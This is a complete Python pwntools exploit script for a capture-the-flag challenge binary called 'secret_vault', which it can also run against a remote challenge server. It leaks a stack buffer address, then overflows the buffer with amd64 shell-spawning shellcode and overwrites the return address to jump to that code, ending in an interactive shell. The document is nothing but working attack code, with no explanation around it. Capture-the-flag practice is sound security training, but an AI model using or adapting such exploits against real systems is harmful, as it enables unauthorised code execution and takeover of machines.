from pwn import *
elf = ELF('./secret_vault')
if args.REMOTE:
    p = remote('vault.challs.olicyber.it',10006)
elif args.GDB:
    p = gdb.debug([elf.path],'''
        b main
        c          
        ''')
else:
    p = process([elf.path])

context.binary = elf
context.terminal = ()
p.recvuntil('>')
p.sendline(b'1')
p.recvuntil(b'messaggio:\n')
shellcode = asm(shellcraft.amd64.linux.sh())
p.sendline(b'a'*72 + b'\x00'*8)
buff_addr = p.recvline().strip()
buff_addr = buff_addr.split(b' ')
buff_addr = buff_addr[-1].decode().replace('!','').replace('0x','')
p.sendlineafter(b'>',b'1')
p.sendlineafter(b'messaggio:\n', shellcode + b'a'*24 + b'\x00'*8 + b'a'*8 + p64(int(buff_addr,16)))

p.interactive()